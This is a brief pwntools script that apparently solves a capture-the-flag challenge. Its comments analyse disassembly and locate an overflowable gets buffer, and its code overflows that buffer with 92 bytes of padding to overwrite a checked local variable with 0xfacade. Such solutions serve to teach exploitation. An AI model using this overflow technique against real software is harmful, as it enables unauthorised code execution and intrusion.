'''
call fgets - it reads a string with defined length
lea rax var_60h (96d)--> rbp-0x60

call gets
cmp dword [var_4h], 0xfacade --> rbp-0x4


Place 20h --> 32 where fgets writes
Place 60h --> 96 where get writes, this one is overridable
(96 - 4) is where value is compared against 0xfacade
'''

from pwn import *


p = process("./chall_01")
# fgets
p.sendline(b"Something")
# gets, it has to send 92 bytes + 0xfacade
p.sendline(b"A"*92 + p32(0xfacade))
p.interactive()
